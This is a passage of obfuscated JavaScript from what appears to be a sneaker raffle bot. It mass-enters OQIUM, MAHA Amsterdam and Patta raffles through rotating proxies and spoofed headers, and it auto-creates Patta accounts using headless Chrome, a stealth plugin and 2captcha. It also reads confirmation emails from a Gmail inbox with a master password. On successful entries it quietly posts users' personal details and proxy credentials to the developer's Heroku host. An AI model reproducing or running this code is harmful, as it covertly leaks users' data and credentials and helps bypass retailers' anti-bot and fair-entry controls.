                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1e3ecb, _0x247050, _0x3d1bbe) {
                    for (var _0x4a7e07 = 0x0; _0x4a7e07 < _0x247050['length']; _0x4a7e07++) {
                        try {
                            await _0x15925d(_0x247050, _0x4a7e07);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x5694ad(_0x2ceb17, _0x23f292, _0x188daf, _0x4c1956, _0x10885d) {
                            var _0x33e462, _0x3c749a = {}, _0x37c4cf = [], _0x46f3ff = {}, _0x4e4cdb = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x524f0e = Math['round'](Math['random']() * (_0x4e4cdb['length'] - 0x1));
                            !_0x4c1956 && (_0x4c1956 = {});
                            if (_0x23f292 != 'ver') {
                                _0x18a4ea(_0x188daf['name'] + '\x20Task\x20' + (_0x2ceb17 + 0x1) + '\x20/\x20' + _0x4c1956['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85), _0x37c4cf = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x5b6a98
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x4c1956[_0x2ceb17]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x5b5c1b['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x300b57
                                        }
                                    ]
                                }], _0x46f3ff = { 'embeds': _0x37c4cf }, _0x3c749a = _0x188daf['data'], _0x3c749a['data']['attributes']['email'] = '' + _0x4c1956[_0x2ceb17]['Email'];
                                if (_0x4c1956[_0x2ceb17]['Size'] == 'RANDOM') {
                                }
                                _0x3c749a['data']['attributes']['properties']['$first_name'] = '' + _0x4c1956[_0x2ceb17]['FirstName'], _0x3c749a['data']['attributes']['properties']['$last_name'] = '' + _0x4c1956[_0x2ceb17]['LastName'], _0x3c749a['data']['attributes']['properties']['$address1'] = _0x4c1956[_0x2ceb17]['Address1'] + '\x20' + _0x4c1956[_0x2ceb17]['Address2'] + '\x20' + _0x4c1956[_0x2ceb17]['HouseNumber'], _0x3c749a['data']['attributes']['properties']['$zip'] = '' + _0x4c1956[_0x2ceb17]['Zip'], _0x3c749a['data']['attributes']['properties']['$city'] = '' + _0x4c1956[_0x2ceb17]['City'], _0x3c749a['data']['attributes']['properties']['$country'] = '' + _0x4c1956[_0x2ceb17]['Country'], _0x4c1956[_0x2ceb17]['Size'] == 'RANDOM' ? _0x3c749a['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4e4cdb[_0x524f0e] : _0x3c749a['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4c1956[_0x2ceb17]['Size'], _0x3c749a['data']['attributes']['properties']['$phone_number'] = '' + _0x4c1956[_0x2ceb17]['Phone'], _0x3c749a['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4c1956[_0x2ceb17]['Follower'];
                            }
                            if (_0x5b5c1b['useRandomProxy'] = ![])
                                var _0x280ce4 = _0x10885d[_0x2ceb17]['split'](':');
                            else
                                var _0x4b8bf3 = Math['round'](Math['random']() * (_0x10885d['length'] - 0x1)), _0x280ce4 = _0x10885d[_0x4b8bf3]['split'](':');
                            var _0x5a6ff6 = {
                                'jar': _0x160c4b,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x188daf['url'],
                                'headers': _0x188daf['headers'],
                                'body': JSON['stringify'](_0x3c749a),
                                'proxy': 'http://' + _0x280ce4[0x2] + ':' + _0x280ce4[0x3] + '@' + _0x280ce4[0x0] + ':' + _0x280ce4[0x1]
                            };
                            return _0x23f292 != 'ver' && (_0x5a6ff6['url'] = _0x188daf['url'], _0x5a6ff6['headers'] = _0x188daf['headers']), _0x23f292 == 'ver' && (_0x5a6ff6['method'] = 'GET'), new Promise(function (_0x59da40, _0xa23749) {
                                callback = async (_0x219fc5, _0xee6f33, _0x157fee) => {
                                    if (!_0x219fc5 && _0xee6f33['statusCode'] == 0xca || !_0x219fc5 && _0xee6f33['statusCode'] == 0xc8) {
                                        if (_0x23f292 != 'ver') {
                                            var _0xa0748f = await _0x42c912(_0x4c1956[_0x2ceb17], _0x188daf, 'dev', ![]), _0x19fe1b = await _0x42c912(_0x4c1956[_0x2ceb17], _0x188daf, 'pub', ![]);
                                            const _0x4347a2 = {
                                                'succesDEVMSG': { 'embeds': [_0xa0748f] },
                                                'succesPUBMSG': { 'embeds': [_0x19fe1b] }
                                            };
                                            let _0x39109e = _0x4c1956[_0x2ceb17];
                                            try {
                                                prxdata = {
                                                    'username': _0x5b6a98['replace']('#', ''),
                                                    'module': _0x188daf['name'],
                                                    'entrydata': JSON['stringify'](_0x39109e),
                                                    'proxy': '' + _0x10885d[_0x2ceb17]
                                                };
                                                var _0x1aad91 = JSON['stringify'](prxdata);
                                                let _0x1e5bd9 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x1aad91, _0x1e5bd9);
                                            } catch (_0x4e897a) {
                                            }
                                            if (_0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '')
                                                try {
                                                    await _0x3b1b09(_0x5b5c1b['webhook'], _0x4347a2['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x4347a2['succesDEVMSG']), await _0x101cd5(0xc8);
                                            try {
                                                await _0x3b1b09(_0x155517, _0x4347a2['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x30fd17(_0x4c1956[_0x2ceb17], _0x188daf);
                                        }
                                        _0x59da40(console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x188daf['name'] + ']\x20Task\x20' + (_0x2ceb17 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x23f292 != 'ver') {
                                            var _0x49753b = '' + _0x219fc5, _0x12adca = await _0x42c912(_0x4c1956[_0x2ceb17], _0x188daf, 'dev', !![], _0x49753b), _0x649a30 = {};
                                            _0x649a30['errorDEV'] = { 'embeds': [_0x12adca] }, _0x3802e1(_0x4c1956[_0x2ceb17], _0x188daf), _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x649a30['errorDEV']), await _0x3b1b09(_0x57f30c, _0x649a30['errorDEV']);
                                        }
                                        _0xa23749(console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x188daf['name'] + ']\x20Task\x20' + (_0x2ceb17 + 0x1) + ':\x20' + _0x219fc5)));
                                    }
                                };
                                try {
                                    _0x23f292 != 'ver' && console['log'](_0x235b96() + '\x20[' + _0x188daf['name'] + ']\x20Task\x20' + (_0x2ceb17 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3c749a['data']['attributes']['email']), _0x29b460(_0x5a6ff6, callback);
                                } catch (_0x36f7bc) {
                                    console['log'](_0x235b96() + '\x20Task\x20' + (_0x2ceb17 + 0x1) + ':\x20' + _0x36f7bc);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x5694ad(_0x4a7e07, 'nor', _0x1e3ecb, _0x247050, _0x3d1bbe), console['log'](_0x235b96() + '\x20[' + _0x1e3ecb['name'] + ']\x20Sleeping\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        } catch (_0x286a64) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4741c8, _0x34a3d0, _0x773531) {
                    var _0x34a3d0 = [], _0x2ee324 = ![];
                    async function _0x274ec0() {
                        var _0x220e56 = new _0x3a8843({
                            'user': _0x5b5c1b['masterMail'],
                            'password': _0x5b5c1b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x30ee62(_0x32ce83) {
                            _0x220e56['openBox']('INBOX', ![], _0x32ce83);
                        }
                        _0x220e56['once']('ready', function () {
                            _0x30ee62(function (_0x100d3f, _0xeeddbb) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x100d3f)
                                    throw _0x100d3f;
                                _0x220e56['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x5757b8, _0x5e2662) {
                                    if (!_0x5e2662 || !_0x5e2662['length'])
                                        console['log'](_0x235b96() + '\x20[' + _0x4741c8['name'] + ']\x20No\x20mails\x20found'), _0x220e56['end']();
                                    else {
                                        var _0x563e1e = _0x220e56['seq']['fetch'](_0x5e2662, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x563e1e['on']('message', function (_0x2410c1, _0x3d5011) {
                                            var _0x373691 = '(#' + _0x3d5011 + ')\x20';
                                            _0x2410c1['on']('body', function (_0x17bbc2, _0x846153) {
                                                _0xbb5a33(_0x17bbc2, (_0x500982, _0x2b17cc) => {
                                                    var _0x4967bf = _0x2b17cc['text']['split']('(')[0x1], _0x17afbc = _0x4967bf['split'](')')[0x0];
                                                    _0x34a3d0['push'](_0x17afbc);
                                                });
                                            }), _0x2410c1['once']('end', function () {
                                            });
                                        }), _0x563e1e['once']('error', function (_0x173f26) {
                                            console['log']('Fetch\x20error:\x20' + _0x173f26), _0x2ee324 = !![];
                                        }), _0x563e1e['once']('end', function () {
                                            _0x220e56['end'](), _0x2ee324 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x220e56['once']('error', function (_0x293ea5) {
                            console['log'](_0x293ea5), _0x2ee324 = !![];
                        }), _0x220e56['once']('end', async function () {
                            _0x2ee324 = !![];
                        }), _0x220e56['connect']();
                    }
                    async function _0x4e07dd(_0x3d7e30, _0x5aef9a, _0x5f0a5f) {
                        for (var _0x3fdbf9 = 0x0; _0x3fdbf9 < _0x5aef9a['length']; _0x3fdbf9++) {
                            async function _0x210d0e(_0x35c558, _0x465737, _0x4e5193, _0x2c5c00, _0x2be863) {
                                var _0x16f64e, _0x34fc9a = {}, _0xf4cc92 = [], _0x37271a = {}, _0x24c1ea = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x561583 = Math['round'](Math['random']() * (_0x24c1ea['length'] - 0x1));
                                _0x2c5c00[_0x35c558]['Size'] == 'RANDOM' && (_0x2c5c00[_0x35c558]['Size'] = _0x24c1ea[_0x561583]);
                                !_0x2c5c00 && (_0x2c5c00 = {});
                                if (_0x5b5c1b['useRandomProxy'] = ![])
                                    var _0x15e22b = _0x2be863[_0x35c558]['split'](':');
                                else
                                    var _0x303137 = Math['round'](Math['random']() * (_0x2be863['length'] - 0x1)), _0x15e22b = _0x2be863[_0x303137]['split'](':');
                                var _0x92e4ef = {
                                    'jar': _0x160c4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4e5193['url'],
                                    'headers': _0x4e5193['headers'],
                                    'body': JSON['stringify'](_0x34fc9a),
                                    'proxy': 'http://' + _0x15e22b[0x2] + ':' + _0x15e22b[0x3] + '@' + _0x15e22b[0x0] + ':' + _0x15e22b[0x1]
                                };
                                return _0x465737 != 'ver' && (_0x92e4ef['url'] = _0x4e5193['url'], _0x92e4ef['headers'] = _0x4e5193['headers']), _0x465737 == 'ver' && (_0x92e4ef['method'] = 'GET', _0x92e4ef['url'] = _0x2c5c00[_0x35c558]), new Promise(function (_0x3b3e3b, _0x5a02a6) {
                                    callback = async (_0x514b7d, _0x409178, _0x1b20c3) => {
                                        if (!_0x514b7d && _0x409178['statusCode'] == 0xca || !_0x514b7d && _0x409178['statusCode'] == 0xc8) {
                                            if (_0x465737 != 'ver') {
                                                var _0x4c24af = await _0x42c912(_0x2c5c00[_0x35c558], _0x4e5193, 'dev', ![]), _0x4327ec = await _0x42c912(_0x2c5c00[_0x35c558], _0x4e5193, 'pub', ![]);
                                                const _0x26c9a9 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4c24af] },
                                                    'succesPUBMSG': { 'embeds': [_0x4327ec] }
                                                };
                                                if (_0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '')
                                                    try {
                                                        await _0x3b1b09(_0x5b5c1b['webhook'], _0x26c9a9['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x26c9a9['succesDEVMSG']), await _0x101cd5(0xc8);
                                                try {
                                                    await _0x3b1b09(_0x155517, _0x26c9a9['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x30fd17(_0x2c5c00[_0x35c558], _0x4e5193);
                                            }
                                            _0x3b3e3b(console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x4e5193['name'] + ']\x20Task\x20' + (_0x35c558 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x465737 != 'ver') {
                                                var _0x538f22 = '' + _0x514b7d, _0x3c6f68 = await _0x42c912(_0x2c5c00[_0x35c558], _0x4e5193, 'dev', !![], _0x538f22), _0xc5cc3b = {};
                                                _0xc5cc3b['errorDEV'] = { 'embeds': [_0x3c6f68] }, _0x3802e1(_0x2c5c00[_0x35c558], _0x4e5193), _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0xc5cc3b['errorDEV']), await _0x3b1b09(_0x57f30c, _0xc5cc3b['errorDEV']);
                                            }
                                            _0x5a02a6(console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x4e5193['name'] + ']\x20Task\x20' + (_0x35c558 + 0x1) + ':\x20' + _0x514b7d)));
                                        }
                                    };
                                    try {
                                        _0x465737 != 'ver' ? console['log'](_0x235b96() + '\x20[' + _0x4e5193['name'] + ']\x20Task\x20' + (_0x35c558 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x34fc9a['data']['attributes']['email']) : console['log'](_0x235b96() + '\x20[' + _0x4e5193['name'] + ']\x20Task\x20' + (_0x35c558 + 0x1) + ':\x20Fetching\x20Response'), _0x29b460(_0x92e4ef, callback);
                                    } catch (_0xbae084) {
                                        console['log'](_0x235b96() + '\x20Task\x20' + (_0x35c558 + 0x1) + ':\x20' + _0xbae084);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x210d0e(_0x3fdbf9, 'ver', _0x3d7e30, _0x5aef9a, _0x5f0a5f), console['log'](_0x235b96() + '\x20[' + _0x3d7e30['name'] + ']\x20Sleeping\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                            } catch (_0x2427b4) {
                            }
                        }
                    }
                    try {
                        _0x274ec0();
                        while (!_0x2ee324) {
                            await _0x101cd5(0xfa0);
                        }
                        console['log']('Found\x20' + _0x34a3d0['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x4e07dd(_0x4741c8, _0x34a3d0, _0x773531);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x47fdd5, _0xfa4292, _0xa7ee4f) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x521320 = 0x0; _0x521320 < _0xfa4292['length']; _0x521320++) {
                        var _0x4ea928 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5b6a98
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5b5c1b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x300b57
                                }
                            ]
                        }];
                        const _0x160651 = { 'embeds': _0x4ea928 };
                        _0x18a4ea(_0x47fdd5['name'] + '\x20Task\x20' + (_0x521320 + 0x1) + '\x20/\x20' + _0xfa4292['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        try {
                            await _0x15925d(_0xfa4292, _0x521320);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x24181d = await _0x42c912(_0xfa4292[_0x521320], _0x47fdd5, 'acc', ![]);
                        const _0x58140f = { 'succesDEVMSG': { 'embeds': [_0x24181d] } };
                        if (_0xfa4292[_0x521320]['Email'] == '' || _0xfa4292[_0x521320]['FirstName'] == '' || _0xfa4292[_0x521320]['LastName'] == '') {
                            console['log'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x521320 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x101cd5(0x7d0);
                            continue;
                        }
                        (_0xfa4292[_0x521320]['Password'] == '' || _0xfa4292[_0x521320] == undefined) && _0xfa4292[_0x521320]['Password'] == 'JRaffles23!';
                        if (_0x5b5c1b['useRandomProxy'] = ![])
                            var _0x4c91d4 = _0xa7ee4f[_0x521320]['split'](':');
                        else
                            var _0x414d48 = Math['round'](Math['random']() * (_0xa7ee4f['length'] - 0x1)), _0x4c91d4 = _0xa7ee4f[_0x414d48]['split'](':');
                        var _0x1b5aed;
                        try {
                            _0x1b5aed = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4c91d4[0x0] + ':' + _0x4c91d4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1b5aed = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4c91d4[0x0] + ':' + _0x4c91d4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x10410b = await _0x1b5aed['newPage']();
                            await _0x10410b['authenticate']({
                                'username': '' + _0x4c91d4[0x2],
                                'password': '' + _0x4c91d4[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x47fdd5['name'] + ']\x20Task\x20' + (_0x521320 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x10410b['setRequestInterception'](!![]), _0x10410b['on']('request', _0x14798c => {
                                _0x14798c['resourceType']() === 'image' || _0x14798c['resourceType']() === 'font' || _0x14798c['resourceType']() === 'media' ? _0x14798c['abort']() : _0x14798c['continue']();
                            }), await _0x10410b['goto']('https://patta.nl/account/register'), await _0x101cd5(0xbb8), await _0x10410b['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x235b96() + '\x20[' + _0x47fdd5['name'] + ']\x20Task\x20' + (_0x521320 + 0x1) + '\x20:\x20Filling\x20information'), await _0x10410b['type']('#RegisterForm-FirstName', '' + _0xfa4292[_0x521320]['FirstName']), await _0x101cd5(0x226), await _0x10410b['type']('#RegisterForm-LastName', '' + _0xfa4292[_0x521320]['LastName']), await _0x101cd5(0x226), await _0x10410b['type']('#RegisterForm-email', '' + _0xfa4292[_0x521320]['Email']), await _0x101cd5(0x226), await _0x10410b['type']('#RegisterForm-password', '' + _0xfa4292[_0x521320]['Password']), await _0x101cd5(0x226), console['log'](_0x235b96() + '\x20[' + _0x47fdd5['name'] + ']\x20Task\x20' + (_0x521320 + 0x1) + '\x20:\x20Submitting..'), await _0x10410b['$eval']('#RegisterForm', _0x211f60 => _0x211f60['submit']()), await _0x101cd5(0x1f40);
                            try {
                                await _0x10410b['waitForSelector']('.home-page-grid__collection'), await _0x101cd5(0x1f4), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x47fdd5['name'] + ']\x20Task\x20' + (_0x521320 + 0x1) + '\x20:\x20Account\x20' + _0xfa4292[_0x521320]['Email'] + '\x20Generated!')), _0x467c3c['appendFileSync']('../accounts/patta.csv', '\x0a' + _0xfa4292[_0x521320]['Email'] + ',' + _0xfa4292[_0x521320]['Password']), console['log'](_0x1ee8dd['yellow'](_0x235b96() + '\x20[' + _0x47fdd5['name'] + ']\x20Task\x20' + (_0x521320 + 0x1) + '\x20:\x20Account\x20' + _0xfa4292[_0x521320]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x58140f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3b1b09(_0x2caac5, _0x58140f['succesDEVMSG']);
                            } catch (_0x68c426) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x521320 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x68c426));
                            }
                        } catch (_0x22cd88) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x521320 + 0x1) + '\x20:\x20' + _0x22cd88));
                        } finally {
                            _0x1b5aed && _0x1b5aed['close'](), console['log']('Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x110076, _0x24d124, _0x42c998) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2cc43a = 0x0; _0x2cc43a < _0x24d124['length']; _0x2cc43a++) {
                        var _0x410943;
                        if (_0x801f14 != 'yes')
                            var _0x801f14 = '', _0x378788 = 0x0;
                        _0x18a4ea(_0x110076['name'] + '\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20/\x20' + _0x24d124['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        try {
                            await _0x15925d(_0x24d124, _0x2cc43a);
                        } catch {
                            _0x801f14 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x24d124[_0x2cc43a]['Email'] == '' || _0x24d124[_0x2cc43a]['Password'] == '' || _0x24d124[_0x2cc43a]['FirstName'] == '' || _0x24d124[_0x2cc43a]['LastName'] == '') {
                            console['log'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5b5c1b['useRandomProxy'] = ![])
                            var _0x4d070a = _0x42c998[_0x2cc43a]['split'](':');
                        else
                            var _0x237b16 = Math['round'](Math['random']() * (_0x42c998['length'] - 0x1)), _0x4d070a = _0x42c998[_0x237b16]['split'](':');
                        var _0x496923;
                        try {
                            _0x496923 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4d070a[0x0] + ':' + _0x4d070a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x496923 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4d070a[0x0] + ':' + _0x4d070a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1c5693 = await _0x496923['newPage']();
                            await _0x1c5693['authenticate']({
                                'username': '' + _0x4d070a[0x2],
                                'password': '' + _0x4d070a[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1c5693['setRequestInterception'](!![]), _0x1c5693['on']('request', _0x4ce8a6 => {
                                _0x4ce8a6['resourceType']() === 'image' || _0x4ce8a6['resourceType']() === 'font' || _0x4ce8a6['resourceType']() === 'media' ? _0x4ce8a6['abort']() : _0x4ce8a6['continue']();
                            }), await _0x1c5693['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1c5693['waitForSelector']('#CustomerEmail'), console['log'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1c5693['type']('#CustomerEmail', '' + _0x24d124[_0x2cc43a]['Email']), await _0x101cd5(0x12c), await _0x1c5693['type']('#CustomerPassword', '' + _0x24d124[_0x2cc43a]['Password']), await _0x101cd5(0x226), await _0x1c5693['$eval']('#customer_login', _0x5740e3 => _0x5740e3['submit']());
                            try {
                                await _0x1c5693['waitForSelector']('#orders'), await _0x101cd5(0x4b0);
                            } catch {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1c5693['goto']('' + _0x24d124[_0x2cc43a]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x101cd5(0xbb8), console['log'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1c5693['waitForSelector']('#email');
                            } catch {
